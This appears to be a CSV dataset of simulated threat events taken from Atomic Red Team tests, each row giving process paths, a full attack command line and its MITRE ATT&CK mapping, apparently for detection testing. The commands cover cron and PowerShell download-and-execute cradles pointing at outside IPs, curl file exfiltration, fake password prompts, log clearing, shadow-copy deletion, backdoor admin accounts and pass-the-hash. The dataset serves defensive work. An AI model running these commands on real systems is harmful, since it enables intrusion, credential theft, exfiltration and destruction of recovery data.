PROC-TE-64,Threat Event,TRUE,WKS64,Get-DomainController with PowerView (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-65,Threat Event,TRUE,WKS65,Get-WmiObject to Enumerate Domain Controllers (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-66,Threat Event,TRUE,WKS66,Remote System Discovery - net group Domain Controller (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"C:\Windows\System32\net.exe group /domain ""Domain controllers""","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-67,Threat Event,TRUE,WKS67,Masquerading as Windows LSASS process (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe,"Defense Evasion
Execution","Masquerading: Rename System Utilities
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
PROC-TE-68,Threat Event,TRUE,WKS68,File Extension Masquerading (Atomic Red Team),C:\Windows\System32\explorer.exe,C:\Users\joebob\AppData\Local\Temp\T1036.007\masquerading.pdf.exe,masquerading.pdf.exe,%temp%\T1036.007\masquerading.pdf.exe,Defense Evasion,Masquerading: Rename System Utilities,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
PROC-TE-69,Threat Event,TRUE,WKS69,Copy a sensitive File over Administrative share with copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy \\\\192.168.4.19\C$\Windows\Temp\credentials.txt %TEMP%\credentials.txt,"Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
PROC-TE-70,Threat Event,TRUE,WKS70,Copy a sensitive File over Administrative share with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe copy-item -Path ""\\\\192.168.4.19\C$\Windows\Temp\credentials.txt"" -Destination ""$Env:TEMP\credentials.txt""","Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
PROC-TE-71,Threat Event,TRUE,WKS71,Add hourly cron job (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl 193.19.194.14/jsgyt | sh"" > /etc/cron.hourly/persistme","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-72,Threat Event,TRUE,WKS72,Add cron job to cron.d directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo '*/5 * * * * root ""curl 193.19.194.14/jsgyt | sh""' > /etc/cron.d/persistme","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-73,Threat Event,TRUE,WKS73,Add cron job via crontab command (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""* * * * * /tmp/a.sh"" > /tmp/b.sh && crontab /tmp/b.sh","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-74,Threat Event,TRUE,WKS74,Add cron job to /var/spool/cron/crontabs/ directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl http://193.176.183.245/ahdytg | sh"" >> /var/spool/cron/crontabs/c","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-75,Threat Event,TRUE,WKS75,Add startup script via schtasks.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\schtasks.exe,schtasks.exe,"C:\Windows\System32\schtasks.exe /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""","Persistence
Execution","Scheduled Task/Job: Scheduled Task
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md,
PROC-TE-76,Threat Event,TRUE,MACPRO76,MacOS credential theft via osascript password prompt (v1 // Atomic Red Team),/bin/bash,/usr/bin/osascript,osascript,"/usr/bin/osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return  default answer """" with icon 1 with hidden answer with title ""Software Update""'","Credential Access
Execution","Input Capture: GUI Input Capture
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
PROC-TE-77,Threat Event,TRUE,WKS77,Windows credential theft via GUI password prompt (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);write-warning $cred.GetNetworkCredential().Password","Credential Access
Execution","Input Capture: GUI Input Capture
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
PROC-TE-78,Threat Event,TRUE,WKS78,MacOS credential theft via osascript password prompt (v2 // Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer');echo $PWD_SPOOF","Credential Access
Execution","Input Capture: GUI Input Capture
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
PROC-TE-79,Threat Event,TRUE,WKS79,Powershell XML download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('http://jjgytsf.xyz/apars');$Xml.command.a.execute | IEX""","Credential Access
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,
PROC-TE-80,Threat Event,TRUE,WKS80,PowerShell fileless script execution - store and run base64 encoded payload in registry (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe reg.exe add ""HKEY_CURRENT_USER\Software\Classes\ATR"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\ATR').ART)))",Execution,"Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,
PROC-TE-81,Threat Event,TRUE,WKS81,MacOS encoded Python script invoked via osascript (Atomic Red Team),/bin/bash,/usr/bin/osascript,osascript,"osascript -e ""do shell script ""echo ""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));"" | python &""""",Execution,"Command and Scripting Interpreter: AppleScript
Command and Scripting Interpreter: Python",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md,
PROC-TE-82,Threat Event,TRUE,WKS82,Local group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net.exe localgroup,"Discovery
Execution","Permission Groups Discovery: Local Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-83,Threat Event,TRUE,WKS83,Domain group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net.exe group /domain,"Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-84,Threat Event,TRUE,WKS84,Domain Enterprise Admins group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net.exe group ""enterprise admins"" /domain","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-85,Threat Event,TRUE,WKS85,Domain Admins group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net.exe group ""domain admins"" /domain","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-86,Threat Event,TRUE,WKS86,Enumerate Active Directory Groups with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-87,Threat Event,TRUE,WKS87,Clear System Eventlog with wevtutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wevtutil.exe,wevtutil.exe,wevtutil cl System,"Defense Evasion
Execution","Indicator Removal on Host: Clear Windows Event Logs
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md,
PROC-TE-88,Threat Event,TRUE,WKS88,Clear Security Eventlog with wevtutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wevtutil.exe,wevtutil.exe,wevtutil cl Security,"Defense Evasion
Execution","Indicator Removal on Host: Clear Windows Event Logs
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md,
PROC-TE-89,Threat Event,TRUE,WKS89,Mount a network share with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net use c: \\\\192.168.1.5\toys,"Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md,
PROC-TE-90,Threat Event,TRUE,WKS90,Create a new local user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user windowsvc /active:yes,"Valid Accounts: Local Accounts
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-91,Threat Event,TRUE,WKS91,Set the password for a new local user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user windowsvc abbc176,"Valid Accounts: Local Accounts
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-92,Threat Event,TRUE,WKS92,Add a new local user to the Local Admins group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net localgroup Administrators windowsvc /add,"Valid Accounts: Local Accounts
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-93,Threat Event,TRUE,WKS93,Add a new local user to the Remote Desktop Users (RDP) group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net localgroup ""Remote Desktop Users"" windowsvc /add","Lateral Movement
Execution","Remote Services: Remote Desktop Protocol
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-94,Threat Event,TRUE,WKS94,Enable RDP connections via registry keys and reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","Lateral Movement
Defense Evasion
Execution","Remote Services: Remote Desktop Protocol
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-95,Threat Event,TRUE,WKS95,Enable RDP connections via registry keys and reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f","Lateral Movement
Defense Evasion
Execution","Remote Services: Remote Desktop Protocol
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-96,Threat Event,TRUE,WKS96,Powershell download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe (New-Object System.Net.WebClient).DownloadFile(""http://193.176.183.245/ahdytg"", ""$env:TEMP\abcc.txt"")","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-97,Threat Event,TRUE,WKS97,Windows tool ingress via curl.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\curl.exe,curl.exe,curl.exe -k http://193.176.183.245/ahdytg -o c:\users\public\music\a.dll,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-98,Threat Event,TRUE,WKS98,Windows file exfiltration via curl.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\curl.exe,curl.exe,curl.exe --upload-file c:\temp\a.7z http://193.176.183.245,"Exfiltration
Execution","Exfiltration Over Web Service
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-99,Threat Event,TRUE,WKS99,Powershell IWR download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell.exe iwr -URI http://193.176.183.245/ahdytg -Outfile C:\Users\joebob\Documents\c.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-100,Threat Event,TRUE,WKS100,Registry autorun persistence via reg.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f,"Persistence
Execution","Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md,
PROC-TE-101,Threat Event,TRUE,WKS101,Add new domain user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net user ""pcz134"" ""lQsia65"" /add /domain","Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md,
PROC-TE-102,Threat Event,TRUE,WKS102,Add new domain user to Domain Admins group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Domain Admins"" ""pcz134"" /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md,
PROC-TE-103,Threat Event,TRUE,WKS103,Discover domain trusts with nltest (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /domain_trusts,"Discovery
Execution","Domain Trust Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md,
PROC-TE-104,Threat Event,TRUE,WKS104,Discover domain trusts with nltest (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /trusted_domains,"Discovery
Execution","Domain Trust Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md,
PROC-TE-105,Threat Event,TRUE,WKS105,Delete volume shadow copies with wmic.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,wmic.exe shadowcopy delete,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
PROC-TE-106,Threat Event,TRUE,WKS106,Wbadmin Delete Windows Backup Catalog (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,wbadmin delete catalog -quiet,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
PROC-TE-107,Threat Event,TRUE,WKS107,Delete Volume Shadow Copies via WMI with PowerShell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell.exe Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell
Windows Management Instrumentation",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
PROC-TE-108,Threat Event,TRUE,WKS108,Service creation via sc.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\sc.exe,sc.exe,"sc.exe create onedrivesvc binPath= ""C:\Windows\Temp\onedrive.exe"" start=auto  type=interact","Persistence
Execution","Create or Modify System Process: Windows Service
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md,
PROC-TE-109,Threat Event,TRUE,WKS109,Service creation via powershell.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe New-Service -Name ""onedrivesvc"" -BinaryPathName ""C:\Windows\Temp\onedrive.exe""","Persistence
Execution","Create or Modify System Process: Windows Service
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md,
PROC-TE-110,Threat Event,TRUE,WKS110,Persistence via Recycle bin and reg.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f","Persistence
Defense Evasion
Execution","Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md,
PROC-TE-111,Threat Event,TRUE,WKS111,Renamed CrackMapExec Pass the Hash (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\JoeBob\Documents\akc.exe,akc.exe,C:\Users\JoeBob\Documents\akc.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami,"Lateral Movement
Execution","Use Alternate Authentication Material: Pass the Hash
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.md,
PROC-TE-112,Threat Event,TRUE,WKS112,Allow RDP (3389/TCP) through Windows firewall with netsh.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\netsh.exe,netsh.exe,"netsh advfirewall firewall add rule name=""windowsfirewallservice"" dir=in protocol=tcp localport=3389 action=allow profile=any","Defense Evasion
Execution","Impair Defenses: Disable or Modify System Firewall
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md,